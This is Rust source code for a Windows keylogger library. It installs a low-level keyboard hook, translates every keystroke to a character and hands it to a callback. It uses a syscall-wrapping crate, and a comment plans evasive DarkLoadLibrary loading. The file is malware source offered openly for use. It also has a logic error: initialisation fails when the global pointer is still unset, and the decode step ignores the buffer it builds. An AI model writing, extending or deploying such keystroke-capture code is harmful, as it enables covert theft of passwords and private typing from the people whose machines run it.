#![no_std]
#![allow(non_snake_case)]
#[macro_use]
extern crate wsyscall_rs;
extern crate alloc;

mod api;
mod error;

use core::{
    char::REPLACEMENT_CHARACTER,
    sync::atomic::{AtomicBool, AtomicPtr, Ordering},
};

use crate::api::*;
use alloc::{boxed::Box, sync::Arc, vec::Vec};
pub use error::*;
use spin::Mutex;

static KEYLOGGER_PTR: AtomicPtr<KeyLogger> = AtomicPtr::new(core::ptr::null_mut());
type BoxedCallback = Arc<Mutex<Box<dyn FnMut(char) + Send + Sync>>>;

pub struct KeyLogger {
    is_logging: AtomicBool,
    hook_id: AtomicPtr<core::ffi::c_void>,
    callback: BoxedCallback,
}

impl KeyLogger {
    /// Helper function to set the logging state
    fn set_logging(&self, value: bool) {
        self.is_logging.store(value, Ordering::Relaxed)
    }

    /// Helper function to set the hook id
    fn set_hook_id(&self, value: *mut core::ffi::c_void) {
        self.hook_id.store(value, Ordering::Relaxed);
    }

    fn set_callback(&self, value: impl FnMut(char) + Send + Sync + 'static) {
        let mut guard = self.callback.lock();
        *guard = Box::new(value);
    }

    pub fn init() -> crate::Result<Arc<Self>> {
        if KEYLOGGER_PTR.load(Ordering::SeqCst).is_null() {
            return Err(Error::KeyLoggerInitialized);
        }
        // TODO: migrate to DarkLoadLibrary implementation, potentially use LdrLoadDll in the meantime??
        let user32 = unsafe { LoadLibraryA("user32.dll\0".as_ptr()) };
        if user32.is_null() {
            return Err(Error::WindowsError(unsafe { GetLastError() }));
        }
        let kl_ptr = Arc::new(Self {
            is_logging: AtomicBool::new(false),
            hook_id: AtomicPtr::new(core::ptr::null_mut()),
            callback: Arc::new(Mutex::new(Box::new(|_| {}))),
        });
        KEYLOGGER_PTR.store(Arc::into_raw(kl_ptr.clone()) as *mut _, Ordering::SeqCst);

        Ok(kl_ptr)
    }

    pub fn start_logging<F>(&self, callback: F) -> crate::Result<()>
    where
        F: FnMut(char) + Send + Sync + 'static,
    {
        let hook_id = unsafe {
            SetWindowsHookExA(
                WH_KEYBOARD_LL,
                Some(KeyLogger::LowLevelKeyboardProc),
                GetModuleHandleA(core::ptr::null()) as *mut _,
                0,
            )
        };

        if hook_id.is_null() {
            let dwerrorcode = unsafe { GetLastError() };
            return Err(Error::WindowsError(dwerrorcode));
        }

        self.set_hook_id(hook_id);
        self.set_callback(callback);
        self.set_logging(true);

        unsafe {
            let mut msg = core::mem::zeroed::<MSG>();
            while GetMessageA(&mut msg, core::ptr::null_mut(), 0, 0) > 0 {
                TranslateMessage(&msg);
                DispatchMessageA(&msg);
            }
        }
        Ok(())
    }

    unsafe extern "system" fn LowLevelKeyboardProc(
        code: i32,
        wparam: WPARAM,
        lparam: LPARAM,
    ) -> LRESULT {
        #[inline]
        fn process_key(pKeyboard: &KBDLLHOOKSTRUCT) -> char {
            let (vk, sc) = (pKeyboard.vkCode, pKeyboard.scanCode);
            let mut buffer = [0u16; 5];

            let mut keyboard_state = [0u8; 256];
            unsafe { GetKeyboardState(keyboard_state.as_mut_ptr()) };
            let result = unsafe {
                ToUnicode(
                    vk,
                    sc,
                    keyboard_state.as_ptr(),
                    buffer.as_mut_ptr(),
                    buffer.len() as i32,
                    0,
                )
            };
            if result > 0 {
                let char_test = buffer[0] as u32;
                if char_test == 32 {
                    return ' ';
                } else {
                    let mut vec = Vec::with_capacity(5);
                    vec.extend_from_slice(&buffer[0..result as usize]);
                    return core::char::decode_utf16(buffer)
                        .map(|r| r.unwrap_or(REPLACEMENT_CHARACTER))
                        .collect::<Vec<_>>()[0];
                }
            }
            REPLACEMENT_CHARACTER
        }

        if code >= 0 && wparam == WM_KEYDOWN as usize {
            let pKeyboard = unsafe { &*(lparam as *const KBDLLHOOKSTRUCT) };
            let kl = KEYLOGGER_PTR.load(Ordering::SeqCst);
            if !kl.is_null() {
                let logger = unsafe { &*kl };
                let callback = &mut logger.callback.lock();
                (callback)(process_key(pKeyboard));
            }
        }
        // we always need to call the next hook to allow other applications' hooks to function appropriately.
        unsafe { CallNextHookEx(core::ptr::null_mut(), code, wparam, lparam) }
    }

    /// Returns whether the keylogger is currently logging keys.
    pub fn is_logging(&self) -> bool {
        self.is_logging.load(Ordering::SeqCst)
    }
}

impl core::ops::Drop for KeyLogger {
    fn drop(&mut self) {
        let hook_id = self.hook_id.load(Ordering::Relaxed);
        if !hook_id.is_null() {
            unsafe { UnhookWindowsHookEx(hook_id) };
        }
    }
}
